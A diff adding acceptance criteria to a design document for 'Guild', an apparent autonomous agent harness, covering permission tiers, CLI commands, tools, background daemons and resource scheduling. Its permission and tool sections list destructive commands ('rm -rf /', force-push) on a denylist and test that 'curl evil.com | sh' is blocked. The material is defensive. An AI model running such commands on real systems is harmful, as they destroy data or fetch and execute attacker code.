@@ -145,6 +145,38 @@ These emerged from design review and govern all implementation decisions:
 | REQ-02.3 | File paths, process management, and networking must use cross-platform abstractions | pathlib, not string concatenation |
 | REQ-02.4 | Platform-specific behavior (idle detection, sleep detection) behind a `PlatformAdapter` interface | Windows + macOS + Linux |
 
+#### Acceptance Criteria (REQ-02.1 through REQ-02.4)
+
+**REQ-02.1 — All core functionality must be OS-agnostic**
+
+- AC-02.1.1: No platform conditionals exist in business logic modules (agent/, provider/, storage/, tools/)
+  - verify: Grep business logic directories for `sys.platform` or `os.name` checks -> zero matches outside daemon/platform.py
+- AC-02.1.2: The full unit test suite passes on Windows, macOS, and Linux
+  - verify: Run `pytest -m unit` on each OS -> all tests pass with zero failures
+
+**REQ-02.2 — Single install mechanism**
+
+- AC-02.2.1: `pip install .` succeeds on all three platforms without platform-specific prerequisites
+  - verify: Run `pip install .` in a clean Python 3.11 venv on each OS -> install completes with exit code 0
+- AC-02.2.2: After install, the `guild` CLI entry point is available on PATH
+  - verify: Run `guild --help` after pip install -> prints usage information with exit code 0
+
+**REQ-02.3 — File paths, process management, and networking must use cross-platform abstractions**
+
+- AC-02.3.1: All file path construction uses `pathlib.Path`, not string concatenation
+  - verify: Grep src/guild/ for `os.path.join` -> zero matches
+- AC-02.3.2: Process spawning uses `asyncio.create_subprocess_exec`, not `os.system` or shell=True
+  - verify: Grep src/guild/ for `os.system` and `shell=True` -> zero matches outside test fixtures
+
+**REQ-02.4 — Platform-specific behavior behind a PlatformAdapter interface**
+
+- AC-02.4.1: `PlatformAdapter` is abstract with methods for idle detection and sleep detection
+  - verify: Subclass `PlatformAdapter` without implementing abstract methods -> `TypeError` raised at instantiation
+- AC-02.4.2: Concrete adapters exist for all three platforms
+  - verify: Import `DarwinAdapter`, `LinuxAdapter`, `WindowsAdapter` -> all three classes resolve without error
+- AC-02.4.3: The correct adapter is auto-selected based on the running OS
+  - verify: Call `PlatformAdapter.create()` on macOS -> returns a `DarwinAdapter` instance
+
 ### REQ-03: Tiered Permission System
 
 **Goal:** Granular, easy-to-switch permission levels that control what agents can do.
@@ -160,6 +192,70 @@ These emerged from design review and govern all implementation decisions:
 | REQ-03.7 | **Hardcoded-never layer** — destructive/irreversible actions blocked regardless of tier | git push --force, rm -rf, history rewrite, money-spending API calls. Overridable only by explicit per-action flag |
 | REQ-03.8 | **Reversibility principle** governs all permission decisions — the harder to undo, the more caution required | This is the universal governance rule across all tiers |
 
+#### Acceptance Criteria (REQ-03.1 through REQ-03.8)
+
+**REQ-03.1 — Tier 0 "Nothing": Agent can only think and respond, no tool use**
+
+- AC-03.1.1: At Tier 0, agent responses contain no tool calls
+  - verify: Set permission tier to 0 and run a task that would normally use tools -> agent produces text-only responses with zero tool invocations
+- AC-03.1.2: At Tier 0, tool call attempts from the model are silently dropped
+  - verify: Force a model response containing a tool call at Tier 0 -> harness filters it out and continues without executing the tool
+
+**REQ-03.2 — Tier 1 "Ask": Agent requests tool use, human approves per-tool**
+
+- AC-03.2.1: At Tier 1, each tool call triggers an approval prompt before execution
+  - verify: Set tier to 1 and run a task -> agent pauses with "Approve file_write to /path? [yes/no/always]" before each tool call
+- AC-03.2.2: Approval granularity supports "once", "per-session", and "per-call"
+  - verify: Approve a tool with "always" at Tier 1 -> subsequent calls to that tool in the same session execute without prompting
+- AC-03.2.3: A denied tool call is reported back to the agent as a refusal
+  - verify: Deny a tool call at Tier 1 -> agent receives a tool result indicating "Permission denied by user" and can adjust its approach
+
+**REQ-03.3 — Tier 2 "Scoped": Agent can use all tools within a defined scope**
+
+- AC-03.3.1: Tools operating within the configured scope execute without approval
+  - verify: Set tier to 2 with scope `/project/src/` -> file_read on `/project/src/main.py` executes immediately without prompting
+- AC-03.3.2: Tools targeting resources outside the scope are blocked
+  - verify: Set tier to 2 with scope `/project/src/` -> file_write to `/etc/passwd` is rejected with "Outside permitted scope"
+- AC-03.3.3: Scope supports directory trees, tool-name sets, and resource patterns
+  - verify: Configure scope as `tools: [file_read, search]` -> file_read executes without prompt; shell_exec is blocked
+
+**REQ-03.4 — Tier 3 "Autopilot": All tools allowed, no approval needed**
+
+- AC-03.4.1: At Tier 3, all tool calls execute without any approval prompt
+  - verify: Set tier to 3 and run a task using file_write, shell_exec, and search -> all execute without pausing for approval
+- AC-03.4.2: Hardcoded-never rules still apply at Tier 3
+  - verify: Set tier to 3 and attempt `rm -rf /` via shell_exec -> blocked by hardcoded-never layer despite Tier 3
+
+**REQ-03.5 — Permission level switchable at runtime**
+
+- AC-03.5.1: Changing permission tier takes effect on the next tool call without restarting the agent
+  - verify: Start a task at Tier 3, switch to Tier 1 via `guild config --set permissions.tier=1` mid-task -> next tool call prompts for approval
+- AC-03.5.2: The current tier is queryable at any time
+  - verify: Run `guild config --get permissions.tier` -> prints the current tier value
+
+**REQ-03.6 — Audit log of all permission decisions**
+
+- AC-03.6.1: Every approval, denial, and auto-permit is recorded with timestamp and context
+  - verify: Run a task at Tier 1, approve one tool, deny another -> `guild audit` shows both decisions with timestamps, tool name, and user action
+- AC-03.6.2: Audit log entries include the permission tier active at the time of the decision
+  - verify: Switch tiers mid-task -> audit log entries reflect the correct tier for each decision
+
+**REQ-03.7 — Hardcoded-never layer blocks destructive actions regardless of tier**
+
+- AC-03.7.1: Commands on the hardcoded-never list are blocked at every tier
+  - verify: Attempt `git push --force` at Tier 3 -> blocked with "Hardcoded-never: destructive action blocked"
+- AC-03.7.2: The hardcoded-never block is overridable only by an explicit per-action flag
+  - verify: Attempt `git push --force` with `--allow-destructive` flag -> action proceeds (with audit log entry)
+- AC-03.7.3: The hardcoded-never list includes rm -rf, git push --force, and history rewrite commands
+  - verify: Inspect the denylist -> contains at minimum `rm -rf /`, `git push --force`, `git rebase` on protected branches
+
+**REQ-03.8 — Reversibility principle governs all permission decisions**
+
+- AC-03.8.1: Read-only operations are permitted at lower tiers than write operations
+  - verify: At Tier 2 with default scope, file_read executes without prompt while file_write to the same path requires scope validation
+- AC-03.8.2: Irreversible actions require higher authorization than reversible ones
+  - verify: Deleting a file (irreversible) requires explicit approval even at Tier 2; creating a new file (reversible) does not
+
 ### REQ-05: CLI Interface
 
 **Goal:** CLI is the complete, authoritative interface. Every operation is a CLI command.
@@ -170,6 +266,40 @@ These emerged from design review and govern all implementation decisions:
 | REQ-05.2 | All agent interaction, monitoring, and config happens via CLI | Nothing requires a GUI |
 | REQ-05.3 | Ability to send messages to the running agent from CLI | `guild chat` for interactive mode |
 | REQ-05.4a | **Interactive attach** — `guild attach` allows sending messages to steer a running task, not just viewing | Challenge decisions, request tweaks, provide answers to queued questions |
+
+#### Acceptance Criteria (REQ-05.1 through REQ-05.4a)
+
+**REQ-05.1 — CLI is the primary interface: every operation is a CLI command**
+
+- AC-05.1.1: Every operation available in Guild has a corresponding CLI command
+  - verify: List all features (task, chat, config, audit, etc.) -> each has a `guild <command>` entry in `guild --help`
+- AC-05.1.2: CLI output is pipe-friendly (structured text, no ANSI codes when piped)
+  - verify: Run `guild ps | cat` -> output contains no ANSI escape sequences
+- AC-05.1.3: CLI commands return meaningful exit codes for scripting
+  - verify: Run `guild task "fail task"` where task fails -> exit code is non-zero (1)
+
+**REQ-05.2 — All agent interaction, monitoring, and config happens via CLI**
+
+- AC-05.2.1: Agent configuration can be viewed and modified entirely from CLI
+  - verify: Run `guild config --set provider.model=gemma4:4b` then `guild config --get provider.model` -> outputs "gemma4:4b"
+- AC-05.2.2: Agent monitoring (status, logs, usage) is accessible without a GUI
+  - verify: Run `guild status`, `guild logs <id>`, `guild usage` -> all produce output without requiring a browser or GUI
+
+**REQ-05.3 — Ability to send messages to the running agent from CLI**
+
+- AC-05.3.1: `guild chat` starts an interactive multi-turn session
+  - verify: Run `guild chat`, type a message, receive agent response, type another -> conversation history is preserved between messages
+- AC-05.3.2: Exiting `guild chat` does not lose conversation state
+  - verify: Run `guild chat`, exchange 3 messages, exit with Ctrl+D -> `guild history` shows the conversation with all 3 exchanges
+
+**REQ-05.4a — Interactive attach allows sending messages to steer a running task**
+
+- AC-05.4a.1: `guild attach <task_id>` connects to a running background task with bidirectional communication
+  - verify: Start a background task, run `guild attach <id>`, type "use a different approach" -> agent receives the message and adjusts
+- AC-05.4a.2: Attaching streams existing output before accepting input
+  - verify: Start a background task that has produced 5 messages, run `guild attach <id>` -> first see the 5 existing messages, then live output
+- AC-05.4a.3: Detaching from an attached session does not stop the background task
+  - verify: Attach to a running task, press Ctrl+C to detach -> `guild ps` still shows the task as running
 
 ### REQ-06: Autonomous Long-Running Operation ("Anti-Babysitting")
 
@@ -190,6 +320,92 @@ These emerged from design review and govern all implementation decisions:
 | REQ-06.11 | **Try-test-rollback for impactful decisions** — for non-trivial choices, try approach A, test it, rollback if it fails, try B | Only escalate to human if all approaches fail |
 | REQ-06.12 | **Decision logging** — every non-trivial decision documented with rationale | Separate from audit log (which tracks tool calls). This tracks "why did I choose X over Y?" |
 
+#### Acceptance Criteria (REQ-06.1 through REQ-06.12)
+
+**REQ-06.1 — Agents must not pause for confirmation unless genuinely blocked**
+
+- AC-06.1.1: Agent completes a multi-step task without prompting the user between steps
+  - verify: Run a task at Tier 3 that requires 5 tool calls -> agent executes all 5 without any "shall I continue?" pauses
+- AC-06.1.2: Agent only pauses when it cannot determine the next action
+  - verify: Give agent a task with ambiguous requirements -> agent attempts its best interpretation first; only escalates if stuck
+
+**REQ-06.2 — Clear "done" criteria per task: agents self-verify completion**
+
+- AC-06.2.1: Agent runs verification checks before declaring a task done
+  - verify: Run a coding task with test suite -> agent runs tests after implementation; task status is `done` only if tests pass
+- AC-06.2.2: A task that fails verification is marked as failed, not done
+  - verify: Agent implements code that fails its test suite -> task status is `failed` with verification failure details
+
+**REQ-06.3 — Stuck detection: recognize when no progress is being made**
+
+- AC-06.3.1: Repeated identical tool calls trigger stuck detection
+  - verify: Agent calls the same tool with the same args 3 times in a row -> stuck detector fires and agent switches strategy
+- AC-06.3.2: Stuck detection identifies repeated failure patterns
+  - verify: Agent encounters the same error 3 consecutive turns -> stuck state is logged with the repeated error pattern
+
+**REQ-06.4 — Graceful degradation on stuck: try alternatives before escalating**
+
+- AC-06.4.1: On stuck detection, agent retries with a different approach before escalating
+  - verify: Agent gets stuck on approach A -> agent logs "Trying alternative approach" and attempts approach B before involving the user
+- AC-06.4.2: The number of alternative attempts is bounded
+  - verify: Agent fails approaches A, B, and C -> escalates to human after exhausting configured max retries (default 3)
+
+**REQ-06.5 — Human escalation only as last resort, with full context**
+
+- AC-06.5.1: Escalation message includes what was tried, what failed, and what is needed
+  - verify: Agent escalates after being stuck -> message includes "Tried: [list], Failed because: [reasons], Need from you: [specific ask]"
+- AC-06.5.2: Escalation is queued asynchronously, not blocking
+  - verify: Agent escalates on subtask A -> continues working on unrelated subtask B while waiting for human response
+
+**REQ-06.6 — Progress persistence: survive crashes, reboots, network drops**
+
+- AC-06.6.1: State is checkpointed to disk on every turn boundary
+  - verify: Kill the agent process after turn 5 of 10 -> `guild resume <id>` resumes from turn 5, not turn 0
+- AC-06.6.2: In-progress tool results are not lost on crash
+  - verify: Agent completes a tool call, crashes before the next LLM call -> resume includes the completed tool result in context
+
+**REQ-06.7 — Configurable autonomy timeout**
+
+- AC-06.7.1: Agent pauses after the configured timeout with a progress report
+  - verify: Set `autonomy.timeout_hours = 1` -> agent pauses after 1 hour with a summary of what was accomplished
+- AC-06.7.2: Timeout of zero means no time limit
+  - verify: Set `autonomy.timeout_hours = 0` -> agent runs indefinitely until task completion or budget exhaustion
+
+**REQ-06.8 — Simple core loop**
+
+- AC-06.8.1: The agent loop is: call model, execute tool if requested, append result, repeat
+  - verify: Enable debug logging and run a task -> log shows the cycle: LLM call -> tool execution -> result appended -> LLM call, with no extraneous steps
+- AC-06.8.2: Loop terminates when the model produces a response with no tool calls
+  - verify: Agent produces a final text response with no tool_calls -> loop exits and task is marked for verification
+
+**REQ-06.9 — Multi-turn conversation: agent loop preserves message history**
+
+- AC-06.9.1: `run()` appends to existing messages rather than resetting
+  - verify: Call `run()` with "do step 1", then call `run()` again with "now do step 2" -> second run sees the full history from step 1
+- AC-06.9.2: Message history is available to `guild chat` across re-entries
+  - verify: Start `guild chat`, send 3 messages, exit, re-enter `guild chat` for the same task -> history of all 3 prior messages is preserved
+
+**REQ-06.10 — Adversarial self-review after tests pass**
+
+- AC-06.10.1: After tests pass, agent actively looks for edge cases the tests might miss
+  - verify: Agent completes implementation and tests pass -> agent generates at least one adversarial probe before declaring done
+- AC-06.10.2: Self-review findings are logged as decision entries
+  - verify: Agent finds an issue during self-review -> `guild decisions <task_id>` shows the finding with "self-review" tag
+
+**REQ-06.11 — Try-test-rollback for impactful decisions**
+
+- AC-06.11.1: Agent creates a checkpoint before attempting a non-trivial approach
+  - verify: Agent decides between two strategies -> creates a checkpoint, tries approach A, runs tests
+- AC-06.11.2: Failed approach is rolled back before trying the alternative
+  - verify: Approach A fails tests -> agent reverts changes to the checkpoint state before attempting approach B
+
+**REQ-06.12 — Decision logging: every non-trivial decision documented with rationale**
+
+- AC-06.12.1: Decisions are stored separately from the tool-call audit log
+  - verify: Agent makes a design choice -> `guild decisions <task_id>` shows the entry; `guild audit` does not contain it as a tool call
+- AC-06.12.2: Each decision entry includes alternatives considered and the reason for selection
+  - verify: Agent chooses approach A over B -> decision log entry includes "Considered: [A, B], Selected: A, Reason: [rationale]"
+
 ### REQ-08: Tool System
 
 **Goal:** Built-in tools that are dedicated and typed (not a generic shell). MCP plugin architecture is P1.
@@ -203,6 +419,61 @@ These emerged from design review and govern all implementation decisions:
 | REQ-08.5 | Tool timeout and resource limits | Prevent a single tool call from hanging the system |
 | REQ-08.6 | Safety rules embedded in tool descriptions | Per Claude Code insight: model sees constraints at invocation time |
 | REQ-08.7 | Shell command denylist — block dangerous patterns unless explicitly overridden | `rm -rf /`, `git push --force`, fork bombs, etc. |
+
+#### Acceptance Criteria (REQ-08.1 through REQ-08.7)
+
+**REQ-08.1 — Standard tool contract: name, description, input schema, execute()**
+
+- AC-08.1.1: Every tool has `name`, `description`, `input_schema`, and `execute()` attributes
+  - verify: Instantiate each built-in tool -> all four attributes are present and non-empty
+- AC-08.1.2: A tool missing any required attribute raises a validation error at registration
+  - verify: Register a tool with no `input_schema` -> raises `ToolValidationError` at startup
+- AC-08.1.3: `execute()` returns a structured `ToolResult` with `output` and `error` fields
+  - verify: Call `execute()` on file_read with a valid path -> returns `ToolResult` with `output` populated and `error` as None
+
+**REQ-08.2 — Dedicated typed tools over generic shell**
+
+- AC-08.2.1: File read, file write, search, and glob each exist as separate tools with their own schemas
+  - verify: List registered tools -> `file_read`, `file_write`, `search`, `glob` are each distinct entries with unique input schemas
+- AC-08.2.2: Each dedicated tool validates its inputs before execution
+  - verify: Call `file_read` with a non-existent path -> returns a descriptive error without executing a shell command
+
+**REQ-08.3 — Built-in tools: file read/write, shell exec, search, glob**
+
+- AC-08.3.1: Default tool set includes file_read, file_write, shell_exec, search, and glob
+  - verify: Initialize Guild with default config -> `agent.tools` contains all 5 built-in tools
+- AC-08.3.2: Shell tool has embedded safety rules visible in its description
+  - verify: Inspect `shell_exec.description` -> contains safety constraints (e.g., "Do not use rm -rf" or denylist reference)
+
+**REQ-08.4 — Tool usage audit log**
+
+- AC-08.4.1: Every tool call is logged with name, args, result, duration, agent ID, and approval status
+  - verify: Run a task that calls file_read -> `guild audit` shows an entry with all 6 fields populated
+- AC-08.4.2: Failed tool calls are logged with the error
+  - verify: Run a task where shell_exec fails -> audit entry includes `status: error` and the error message
+
+**REQ-08.5 — Tool timeout and resource limits**
+
+- AC-08.5.1: A tool call exceeding the configured timeout is killed and returns an error
+  - verify: Set `tools.timeout_seconds = 2` and run `shell_exec("sleep 30")` -> tool is terminated after 2s with a timeout error
+- AC-08.5.2: Tool output exceeding the configured max size is truncated
+  - verify: Run a tool producing large output with `tools.max_output_bytes = 1024` -> result is truncated to 1024 bytes with a truncation notice
+
+**REQ-08.6 — Safety rules embedded in tool descriptions**
+
+- AC-08.6.1: Tool descriptions contain safety constraints visible to the model at invocation time
+  - verify: Inspect the tool schema sent to the LLM -> each tool's description includes its safety rules inline
+- AC-08.6.2: Safety rules are not in a separate document the model might ignore
+  - verify: The system prompt does not contain tool safety rules separately; they exist only in the tool descriptions
+
+**REQ-08.7 — Shell command denylist: block dangerous patterns**
+
+- AC-08.7.1: Commands matching the denylist are rejected before execution
+  - verify: Call `shell_exec("rm -rf /")` -> returns "Command blocked: matches denylist pattern" without executing
+- AC-08.7.2: The denylist is configurable with additions
+  - verify: Add `"curl.*|sh"` to the denylist in config -> `shell_exec("curl evil.com | sh")` is blocked
+- AC-08.7.3: Blocked commands are logged in the audit trail
+  - verify: Attempt a denied command -> `guild audit` shows an entry with `status: blocked` and the matched denylist pattern
 
 ### REQ-23: Background/Daemon Execution
 
@@ -219,6 +490,79 @@ These emerged from design review and govern all implementation decisions:
 | REQ-23.7 | Multiple concurrent background tasks supported, subject to `max_concurrent_agents` config | Additional tasks queue; queue persisted in SQLite (survives reboot) |
 | REQ-23.8 | Foreground mode (no `--background`) remains the default | No regression on interactive use |
 | REQ-23.9 | Daemon uses a control socket (`.guild/run/guild.sock`) for control messages | Enables pause, resume, kill without PID signaling |
+
+#### Acceptance Criteria (REQ-23.1 through REQ-23.9)
+
+**REQ-23.1 — `guild task "description" --background` launches the agent in a detached daemon process**
+
+- AC-23.1.1: Background flag spawns a detached process that outlives the launching terminal
+  - verify: Run `guild task "hello" --background` -> CLI prints task ID and returns within 2 seconds; closing the terminal does not kill the agent process
+- AC-23.1.2: CLI confirms launch with the assigned task ID
+  - verify: Run `guild task "hello" --background` -> stdout includes a line like "Launched background task <task_id>"
+- AC-23.1.3: Background launch fails gracefully when provider is unreachable
+  - verify: Stop Ollama, run `guild task "hello" --background` -> CLI reports launch failure with a clear error message (not a stack trace)
+
+**REQ-23.2 — Daemon writes PID to `.guild/run/<task_id>.pid` and state to SQLite**
+
+- AC-23.2.1: PID file is created on daemon start and contains the correct process ID
+  - verify: Launch a background task -> `.guild/run/<task_id>.pid` exists and `cat` returns a PID that matches the running daemon process
+- AC-23.2.2: Task state is persisted in SQLite on every turn boundary
+  - verify: Launch a background task, let it run 3+ turns -> query `tasks` table in SQLite -> status is `in-progress` and messages table has 3+ entries
+- AC-23.2.3: PID file is removed on clean daemon exit
+  - verify: Launch a background task, let it complete -> `.guild/run/<task_id>.pid` no longer exists
+
+**REQ-23.3 — `guild attach <task_id>` reconnects to a running background task, streaming output in real-time**
+
+- AC-23.3.1: Attach streams existing messages then live output
+  - verify: Launch a background task, wait for 2+ messages, run `guild attach <task_id>` -> terminal shows all past messages followed by new messages as they arrive
+- AC-23.3.2: Attach to a non-existent task ID returns a clear error
+  - verify: Run `guild attach nonexistent-id` -> CLI prints "Task not found" (not a crash)
+- AC-23.3.3: Detaching from an attached session does not stop the background task
+  - verify: Attach to a running task, press Ctrl+C to detach -> the background daemon process continues running
+
+**REQ-23.4 — `guild logs <task_id> [--follow]` streams agent output without interaction**
+
+- AC-23.4.1: Logs without `--follow` prints all messages and exits
+  - verify: Run `guild logs <task_id>` on a completed task -> prints all messages then returns to shell prompt
+- AC-23.4.2: Logs with `--follow` tails new messages in real-time
+  - verify: Run `guild logs <task_id> --follow` on a running task -> new messages appear within 1 second of being generated
+
+**REQ-23.5 — `guild ps` shows all running/paused/queued tasks with PIDs and elapsed time**
+
+- AC-23.5.1: `guild ps` lists active tasks with their status, PID, and elapsed time
+  - verify: Launch two background tasks -> `guild ps` -> output table contains both task IDs, statuses (`running`), PIDs, and elapsed time columns
+- AC-23.5.2: `guild ps` with no running tasks shows an empty result (not an error)
+  - verify: With no tasks running, run `guild ps` -> output indicates no active tasks
+
+**REQ-23.6 — Daemon process is a minimal supervisor: asyncio event loop, signal handling, crash recovery**
+
+- AC-23.6.1: Daemon recovers from a transient tool failure without exiting
+  - verify: Inject a tool that raises an exception on first call -> daemon retries or skips and continues the agent loop (does not crash)
+- AC-23.6.2: Daemon handles SIGTERM gracefully
+  - verify: Send SIGTERM to daemon PID -> daemon finishes current tool call, saves state, exits with code 0
+
+**REQ-23.7 — Multiple concurrent background tasks supported, subject to `max_concurrent_agents` config**
+
+- AC-23.7.1: Tasks exceeding `max_concurrent_agents` are queued
+  - verify: Set `max_concurrent_agents = 1`, launch two background tasks -> first runs immediately, second shows status `queued` in `guild ps`
+- AC-23.7.2: Queued tasks start automatically when a running task completes
+  - verify: With `max_concurrent_agents = 1`, launch two tasks -> first completes -> second transitions from `queued` to `running` without manual intervention
+- AC-23.7.3: Queue survives a reboot
+  - verify: Queue a task, kill the Guild daemon, restart Guild -> queued task is still present in `guild ps`
+
+**REQ-23.8 — Foreground mode (no `--background`) remains the default**
+
+- AC-23.8.1: Running `guild task "hello"` without `--background` blocks the terminal and streams output inline
+  - verify: Run `guild task "hello"` -> terminal is occupied until the task completes; output streams to stdout
+
+**REQ-23.9 — Daemon uses a control socket (`.guild/run/guild.sock`) for control messages**
+
+- AC-23.9.1: Control socket is created on daemon start
+  - verify: Launch a background task -> `.guild/run/guild.sock` exists and is a Unix domain socket
+- AC-23.9.2: Control commands (pause, resume, kill) are delivered via the socket
+  - verify: Launch a background task, send a `pause` command over the socket -> daemon transitions task to `paused` state
+- AC-23.9.3: Stale socket file from a crashed daemon does not prevent a new daemon from starting
+  - verify: Create a stale `.guild/run/guild.sock` file, launch a background task -> daemon cleans up the stale socket and starts successfully
 
 ### REQ-24: Resource-Aware Scheduling ("Good Neighbor")
 
@@ -237,6 +581,92 @@ These emerged from design review and govern all implementation decisions:
 | REQ-24.9 | All thresholds configurable per-project and globally | `idle_timeout_minutes`, `cpu_threshold_percent`, `gpu_threshold_percent` |
 | REQ-24.10 | Resource monitor runs as a lightweight thread in the daemon, polling every 5-10s | Minimal overhead |
 
+#### Acceptance Criteria (REQ-24.1 through REQ-24.10)
+
+**REQ-24.1 — Detect user activity state: `active` vs `idle` (no input for N minutes)**
+
+- AC-24.1.1: User is detected as `active` when there has been recent keyboard or mouse input
+  - verify: Move the mouse, query resource monitor -> activity state is `active`
+- AC-24.1.2: User is detected as `idle` after the configured timeout with no input
+  - verify: Set `idle_timeout_minutes = 1`, wait 90 seconds with no input -> activity state transitions to `idle`
+- AC-24.1.3: Activity detection works on both macOS and Linux
+  - verify: Run on macOS -> uses IOKit/CGEventSource. Run on Linux -> uses `/proc/interrupts` or `xprintidle`. Both report correct state
+
+**REQ-24.2 — Detect system load: CPU utilization, GPU utilization, memory pressure**
+
+- AC-24.2.1: CPU utilization is reported as a percentage
+  - verify: Run `guild resource-status` -> output includes CPU utilization as a percentage (e.g., "CPU: 45%")
+- AC-24.2.2: Memory pressure is detected
+  - verify: Allocate memory until pressure is high -> resource monitor reports elevated memory usage
+- AC-24.2.3: GPU utilization is reported when a GPU is present
+  - verify: On a machine with a GPU running Ollama -> `guild resource-status` includes GPU utilization percentage
+
+**REQ-24.3 — Three scheduling modes: `full` (no throttling), `polite` (yield on user activity), `stealth` (only run when idle)**
+
+- AC-24.3.1: Default mode is `polite`
+  - verify: Fresh install with no `[resource]` section in config -> `guild resource-status` reports mode as `polite`
+- AC-24.3.2: Mode is configurable via config file
+  - verify: Set `resource.mode = "stealth"` in config -> `guild resource-status` reports mode as `stealth`
+- AC-24.3.3: Invalid mode value is rejected at startup
+  - verify: Set `resource.mode = "turbo"` -> startup fails with "Invalid scheduling mode 'turbo'; valid options: full, polite, stealth"
+
+**REQ-24.4 — `polite` mode: when user is active, delay between LLM calls (configurable backoff)**
+
+- AC-24.4.1: Active user triggers a delay before the next LLM call
+  - verify: In `polite` mode with user active -> measure time between consecutive LLM calls -> delay matches configured backoff (e.g., 5 seconds)
+- AC-24.4.2: Running inference is not interrupted
+  - verify: Start an LLM call, then user becomes active -> the in-flight call completes; only the next call is delayed
+- AC-24.4.3: Backoff duration is configurable
+  - verify: Set `resource.polite_backoff_seconds = 10` -> delay between LLM calls during active user is ~10 seconds
+
+**REQ-24.5 — `stealth` mode: when user is active, pause all agent work. Resume after N minutes idle**
+
+- AC-24.5.1: Agent pauses when user becomes active
+  - verify: Agent is running in `stealth` mode, user moves mouse -> agent loop pauses; no new LLM calls are made
+- AC-24.5.2: Agent resumes after configured idle timeout
+  - verify: Agent is paused in stealth mode, user stops activity, configured idle timeout passes -> agent resumes
+- AC-24.5.3: Stealth pause is logged
+  - verify: Stealth pause triggers -> log entry "Stealth mode: pausing agent work (user active)"
+
+**REQ-24.6 — GPU awareness: if VRAM is under pressure, Guild can unload the model or defer**
+
+- AC-24.6.1: VRAM pressure is detected via Ollama
+  - verify: Load a large model consuming most VRAM -> resource monitor reports VRAM pressure
+- AC-24.6.2: Guild defers new inference when VRAM is critical
+  - verify: VRAM usage exceeds threshold -> next LLM call is deferred until VRAM drops below threshold
+- AC-24.6.3: Model unload is requested when configured
+  - verify: Set `resource.unload_on_vram_pressure = true` -> when VRAM exceeds threshold, Guild requests Ollama to unload the model
+
+**REQ-24.7 — Thermal awareness (macOS): if thermally throttled, reduce inference rate**
+
+- AC-24.7.1: Thermal throttling state is detected on macOS
+  - verify: On macOS with thermal pressure -> `guild resource-status` shows thermal state (e.g., "Thermal: nominal" or "Thermal: critical")
+- AC-24.7.2: Inference rate is reduced during thermal throttling
+  - verify: Simulate thermal throttling -> delay between LLM calls increases; log entry "Thermal throttling detected; reducing inference rate"
+
+**REQ-24.8 — `guild resource-status` shows current mode, system load, throttle state**
+
+- AC-24.8.1: Output includes scheduling mode, CPU, memory, and throttle state
+  - verify: Run `guild resource-status` -> output includes mode (e.g., "polite"), CPU %, memory %, user activity state, and current throttle status
+- AC-24.8.2: Output includes GPU info when available
+  - verify: On a GPU-equipped machine -> `guild resource-status` includes GPU utilization and VRAM usage
+
+**REQ-24.9 — All thresholds configurable per-project and globally**
+
+- AC-24.9.1: Project-level thresholds override global defaults
+  - verify: Set global `cpu_threshold_percent = 80`, project-level `cpu_threshold_percent = 60` -> project uses 60%
+- AC-24.9.2: Missing project-level thresholds fall back to global
+  - verify: Set global `idle_timeout_minutes = 5`, no project-level override -> project uses 5 minutes
+
+**REQ-24.10 — Resource monitor runs as a lightweight thread in the daemon, polling every 5-10s**
+
+- AC-24.10.1: Monitor runs continuously in the background
+  - verify: Launch a background task -> resource monitor thread is active; `guild resource-status` returns current data (not stale)
+- AC-24.10.2: Monitor overhead is minimal
+  - verify: Measure CPU usage of the Guild daemon with the resource monitor running -> monitor thread consumes less than 1% CPU
+- AC-24.10.3: Poll interval is respected
+  - verify: Log resource monitor poll timestamps -> consecutive polls are 5-10 seconds apart
+
 ### REQ-25: Process Lifecycle Management
 
 **Goal:** Robust lifecycle — clean start, clean stop, crash recovery, external control.
@@ -253,6 +683,85 @@ These emerged from design review and govern all implementation decisions:
 | REQ-25.8 | `guild kill --all` stops all running Guild tasks in this project | Convenience for "stop everything now" |
 | REQ-25.9 | Meaningful exit codes: 0=success, 1=task failed, 2=interrupted, 3=crash recovery available | Scriptable |
 
+#### Acceptance Criteria (REQ-25.1 through REQ-25.9)
+
+**REQ-25.1 — `guild kill <task_id>` sends graceful shutdown to a running background task**
+
+- AC-25.1.1: Kill initiates graceful shutdown allowing the current tool call to finish
+  - verify: Launch a background task running a 3-second shell command, immediately run `guild kill <task_id>` -> shell command completes, state is saved, daemon exits
+- AC-25.1.2: Hard kill fires after the 10-second timeout if graceful shutdown stalls
+  - verify: Launch a background task with a tool that hangs indefinitely, run `guild kill <task_id>` -> after 10 seconds, process is forcibly terminated
+- AC-25.1.3: Kill on a non-existent task ID produces a clear error
+  - verify: Run `guild kill nonexistent-id` -> error message "Task not found: nonexistent-id"
+
+**REQ-25.2 — `guild pause <task_id>` pauses a running task (no new turns start)**
+
+- AC-25.2.1: Pause stops the agent loop after the current turn completes
+  - verify: Run `guild pause <task_id>` on a running task -> in-flight LLM call finishes, no new turn starts; `guild ps` shows status `paused`
+- AC-25.2.2: Pause on an already-paused task is a no-op with a message
+  - verify: Pause a task, then pause it again -> CLI prints "Task <task_id> is already paused"
+- AC-25.2.3: State is persisted to SQLite when paused
+  - verify: Pause a task -> query SQLite -> task status is `paused` and all messages up to the last completed turn are present
+
+**REQ-25.3 — `guild resume <task_id>` resumes a paused task from last checkpoint**
+
+- AC-25.3.1: Resume reloads messages from SQLite and continues the agent loop
+  - verify: Pause a task at turn 5, run `guild resume <task_id>` -> agent continues from turn 6 with full message history
+- AC-25.3.2: Resume re-validates the provider before continuing
+  - verify: Pause a task, stop Ollama, run `guild resume <task_id>` -> error "Cannot resume: provider health check failed"
+- AC-25.3.3: Resume on a task that is not paused produces a clear error
+  - verify: Run `guild resume <task_id>` on a running task -> error "Task <task_id> is not paused; current status: running"
+
+**REQ-25.4 — Signal handling: SIGTERM/SIGINT -> graceful shutdown, SIGUSR1 -> checkpoint-and-continue**
+
+- AC-25.4.1: SIGTERM triggers graceful shutdown
+  - verify: Send SIGTERM to the daemon -> daemon saves state and exits with code 0
+- AC-25.4.2: SIGINT triggers graceful shutdown
+  - verify: Send SIGINT to the daemon -> daemon saves state and exits with code 0
+- AC-25.4.3: SIGUSR1 triggers checkpoint without stopping
+  - verify: Send SIGUSR1 to the daemon -> a checkpoint is written to SQLite; agent continues running
+
+**REQ-25.5 — Crash recovery: detect orphaned PID files, offer `guild resume <task_id>`**
+
+- AC-25.5.1: Orphaned PID file is detected when the PID process is not alive
+  - verify: Create a `.guild/run/<task_id>.pid` with a dead PID -> `guild ps` marks the task as `interrupted`
+- AC-25.5.2: Recovery suggestion is offered for interrupted tasks
+  - verify: `guild ps` shows an interrupted task -> output includes "Run `guild resume <task_id>` to recover"
+- AC-25.5.3: Orphaned PID file is cleaned up on resume
